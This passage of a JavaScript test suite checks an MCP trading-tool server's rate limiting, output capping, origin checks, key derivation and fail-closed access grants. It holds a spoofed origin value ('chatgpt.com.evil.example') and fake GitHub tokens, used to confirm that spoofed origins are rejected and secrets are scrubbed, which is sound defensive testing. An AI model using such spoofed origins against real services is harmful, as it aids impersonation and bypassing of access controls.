  const now = Date.now(); for (let i = 0; i < L.LIMITS.heavy[0]; i++) assert.equal(L.limited('fred', 'heavy', now), 0);
  assert.ok(L.limited('fred', 'heavy', now) > 0); assert.equal(L.limited('orlando', 'heavy', now), 0, 'per key'); assert.equal(L.limited('fred', 'heavy', now + 601e3), 0, 'the window rolls');
  for (let i = 0; i < 50; i++) assert.equal(L.limited('fred', 'propose', now, true), 0, 'a peek never counts (a refused patch costs no proposal)');
  L.RL.clear(); for (let i = 0; i < L.LIMITS.heavy[0]; i++) L.limited('fred', 'heavy');
  const r = await rpcCall('ict_backtest', { market: 'nq' }); assert.equal(r.result.isError, true); assert.match(r.result.content[0].text, /Rate limit: try again in \d+ s/);
  L.RL.clear(); for (let i = 0; i < L.LIMITS.all[0]; i++) L.limited('fred', 'all');
  assert.match((await rpcCall('ict_guide', {})).result.content[0].text, /Rate limit/);
  reset();
});
test('output cap: a huge answer is cut, with a hint, and no structured copy', async () => {
  reset();
  const big = Array.from({ length: 200 }, (_, i) => ({ id: `nq-b-${i}`, market: 'nq', short: 'NQ', side: 'buy', signalAt: 1700000000 + i, status: 'win', R: 1, path: Array.from({ length: 400 }, () => [1.25, -0.5, 0.75]) }));
  await withNet(fakeFetch({ files: { 'council-data:ict/trades.json': big } }), async () => {
    const r = await rpcCall('ict_trades', { source: 'live', full: true, limit: 200 });
    assert.ok(r.result.content[0].text.length <= 150e3 + 200); assert.match(r.result.content[0].text, /cut at 150 000 characters/); assert.equal(r.result.structuredContent, undefined);
  });
});
test('no secrets in answers or logs: GitHub errors scrubbed; logs carry member, tool, time only', async () => {
  reset();
  const logs = [], log = console.log; console.log = (...a) => logs.push(a.join(' '));
  try {
    await withNet(fakeFetch({ routes: [['GET', /^\/git\/trees\//, () => new Response('bad credentials ghp_abcdefSECRET github_pat_XYZ', { status: 500 })]] }), async () => {
      const r = await post({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'ict_file_list', arguments: {} } });
      assert.equal(r.body.result.isError, true); assert.ok(!/ghp_abcdef|github_pat_XYZ/.test(r.body.result.content[0].text));
      await post({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'ict_note', arguments: { text: 'PRIVATE-NOTE-TEXT' } } });
    });
  } finally { console.log = log; }
  const all = logs.join('\n'); assert.ok(logs.some((l) => /\[mcp\] fred ict_file_list error \d+ms/.test(l)), all);
  for (const s of [KEY, 'PRIVATE-NOTE-TEXT', 'ghp_', 'ghp_fake']) assert.ok(!all.includes(s), s);
});
test('noPing and origins', () => {
  assert.equal(L.noPing('ask @vazxanana and @x-y, mail a@b.c'), 'ask `@vazxanana` and `@x-y`, mail a@b.c');
  assert.equal(L.originOk(undefined), true); assert.equal(L.originOk('https://chatgpt.com'), true); assert.equal(L.originOk('https://claude.ai'), true);
  assert.equal(L.originOk('https://chatgpt.com.evil.example'), false); assert.equal(L.originOk('https://x.example', { MCP_ORIGINS: 'https://x.example' }), true);
});

// ---- end to end, the way ChatGPT drives a connector ----
test('end to end: initialize → initialized → tools/list → tools/call (guide, backtest) over the HTTP handler', async () => {
  reset(); process.env.OANDA_TOKEN = 'oanda-fake';
  const H = { origin: 'https://chatgpt.com' };
  await withNet(fakeFetch(), async () => {
    const i = await post({ jsonrpc: '2.0', id: 0, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'openai-mcp', version: '1.0.0' } } }, H);
    assert.equal(i.code, 200); assert.equal(i.headers['content-type'], 'application/json'); const v = i.body.result.protocolVersion; assert.equal(v, '2025-06-18');
    const H2 = { ...H, 'mcp-protocol-version': v };
    assert.equal((await post({ jsonrpc: '2.0', method: 'notifications/initialized' }, H2)).code, 202);
    const l = await post({ jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} }, H2); assert.ok(l.body.result.tools.length >= 17);
    const g = await post({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'ict_guide', arguments: {} } }, H2); assert.ok(g.body.result.structuredContent.rules.length >= 5);
    const b = await post({ jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'ict_backtest', arguments: { market: 'es', from: '2020-01-01', to: '2021-06-30', oos_from: '2021-01-01', sample_size: 3 } } }, H2);
    assert.equal(b.code, 200); assert.equal(b.body.id, 3); const o = b.body.result.structuredContent; assert.ok(o.combined.all.n > 0); assert.deepEqual(JSON.parse(b.body.result.content[0].text).combined, o.combined, 'text and structured agree');
    assert.equal((await post({ jsonrpc: '2.0', id: 4, method: 'ping' }, H2)).body.result && true, true);
  });
  reset();
});
// key handling from before, unchanged
test('profile key: a member proves the password; the owner reserved name and unknown actions are refused', async () => {
  process.env.MCP_KEYS = 'fred:abcdefghijklmnopqrstuvwx';
  assert.deepEqual(L.PROFILE_USERS, ['fred']);
  const mk = (body) => drive(handler, { method: 'POST', query: {}, headers: { host: 'meridianx.dev' }, body });
  assert.equal((await mk({ action: 'mykey', user: 'owner', pw: 'x' })).code, 403);
  assert.equal((await mk({ action: 'mykey', user: 'Bad Name!', pw: 'x' })).code, 403);
  assert.equal((await mk({ action: 'other' })).code, 400);
  const r = await mk({ action: 'mykey', user: 'fred', pw: 'wrong' });   // the user list fails closed here (no Blob): never a URL
  assert.notEqual(r.code, 200); assert.ok(!JSON.stringify(r.body).includes('abcdefghijklmnopqrstuvwx'));
});
test('derived keys: name.hmac, stable, any granted member, MCP_KEYS overrides; a grant is checked on every call', async () => {
  const env = { CTRADER_LINK_KEY: 'link-secret' };
  const k = L.derivedKey('fred', env); assert.match(k, /^fred\.[A-Za-z0-9_-]{32}$/); assert.equal(k, L.derivedKey('fred', env)); assert.notEqual(k, L.derivedKey('fred', { CTRADER_LINK_KEY: 'other' }));
  assert.equal(L.derivedKey('owner', env), null); assert.equal(L.derivedKey('fred', {}), null); assert.match(L.derivedKey('carlos', env), /^carlos\./);
  assert.equal(L.keyFor('fred', env), k); assert.equal(L.keyFor('fred', { ...env, MCP_KEYS: 'fred:overrideoverrideoverride' }), 'overrideoverrideoverride');
  assert.equal(L.whoIs(k, env), 'fred'); assert.equal(L.whoIs(L.derivedKey('carlos', env), env), 'carlos'); assert.equal(L.whoIs(k.slice(0, -1) + (k.endsWith('A') ? 'B' : 'A'), env), null); assert.equal(L.whoIs('fred.short', env), null);
  L.GRANT.users = { carlos: { perms: { mcp: true } }, orlando: { mcp: true }, fred: { perms: { mcp: false } }, luxus: {} }; L.GRANT.at = Date.now();
  assert.equal(await L.granted('carlos', 'h', env), true); assert.equal(await L.granted('orlando', 'h', env), true); assert.equal(await L.granted('luxus', 'h', env), false); assert.equal(await L.granted('fred', 'h', env), false);
  assert.equal(await L.granted('luxus', 'h', { ...env, MCP_KEYS: 'luxus:abcdefghijklmnopqrstuvwx' }), true);
  L.GRANT.users = { fred: {} }; assert.equal(await L.granted('fred', 'h', env), true); L.GRANT.users = null;
});
test('grant fails closed: an unreadable user list never grants a built-in member (a disabled Fred stays out)', async () => {
  L.GRANT.users = null; L.GRANT.at = 0;
  assert.equal(await L.granted('fred', 'bad host!', { CTRADER_LINK_KEY: 'link-secret' }), false);   // bad host: blobUsers throws
  L.GRANT.users = null; L.GRANT.at = 0;
});
